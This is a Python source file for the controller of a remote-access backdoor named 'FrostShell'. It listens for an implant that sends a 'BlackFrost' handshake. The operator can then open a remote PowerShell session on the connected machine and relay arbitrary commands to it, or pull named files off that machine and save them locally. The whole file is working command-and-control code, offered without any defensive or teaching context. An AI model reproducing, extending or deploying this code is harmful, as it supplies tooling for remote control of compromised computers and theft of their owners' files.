import socket
import sys
import struct
import select
import time
import datetime

#socket.recv(): if there is no byte sent to the server --> wait until it can read at least 1 byte
#if there are some bytes sent, read them and return immediately, regardless of the parameter passed to the function


acceptedCMD = {"exit": 1, "powershell": 2, "get": 3}

def performHandshake(c):
    handshake = c.recv(10)
    #print("Handshake received " + str(handshake))
    if(handshake == b"BlackFrost"):
        c.send(b"BlackFrost\0")
        return True
    else:
        return False

#receive data from client 
#return data type is string  
def receiveData(c, timeout = 2):
    data = b""
    c.setblocking(False)
    while True:
        ready = select.select([c], [], [], timeout)
        if (ready[0]):
            result = c.recv(64)
            data += result
        else:
            break
    c.setblocking(True)
    return data.decode("utf-8")

#read command from stdin and parse it
#return data type is string
def getCommand():
    while True:
        command = input("FrostShell> ").split(" ")
        if (command[0] in acceptedCMD.keys()):
            return command
        elif (command[0] == "close"):
            exit(0)
        print("Invalid command")
    
def communicatePowershell(c):
    while True:
        command = sys.stdin.readline()  #use this instead of raw_input so we can get the \n character
        payload = struct.pack("<i", acceptedCMD["powershell"]) + command.encode("utf-8") + b"\0"
        c.send(payload)
        result = receiveData(c, 5)
        if (result):
            sys.stdout.write(result)
        else:
            print("Can't get powershell's input")
            break
        
        if (command == "exit\n"):
            break
        
#can only get 1 file at a time for now
def getFileFromClient(c, command):
    #check command syntax
    if (len(command) < 2):
        print("Missing file name")
        return
    clientCmd = struct.pack("<i", acceptedCMD[command[0]]) + command[1].encode("utf-8")
    connection.send(clientCmd)
    
    filename = datetime.datetime.now().strftime("%H-%M-%d-%m-%Y") + command[1].split("\\")[-1] 
    c.setblocking(False)
    with open(filename, "wb+") as f:
        while True:
            ready = select.select([c], [], [], 60)
            if (ready[0]):
                data = c.recv(1024)
                f.write(data)
            else:
                break
    c.setblocking(True)
    return
    


        
    
addr = ("localhost", 8888)
s = socket.socket()
s.bind(addr)
s.listen(1)

while True:
    print("Waiting for connection...")
    (connection, clientAddr) = s.accept()
    try:
        print('connection from', clientAddr)
        #close the connection if the handshake fails
        if (performHandshake(connection)):
            while True:
                command = getCommand()               

                #handle each command
                if (command[0] == "exit"):
                    print("Turn off shell")
                    connection.send(struct.pack("<i", acceptedCMD[command[0]])) #send command code to the client
                    break
                
                elif (command[0] == "powershell"):
                    print("Open Powershell")
                    connection.send(struct.pack("<i", acceptedCMD[command[0]])) #send command code to the client
                    output = receiveData(connection, 5)
                    if (output):
                        sys.stdout.write(output)
                    else:
                        print("Client error")
                        break
                    communicatePowershell(connection)
                    
                elif (command[0] == "get"):
                    getFileFromClient(connection, command)
              
                               
        
        else:
            print("Handshake failed")
            break

    #finally block always execute after try block        
    finally:
        # Clean up the connection
        connection.close()
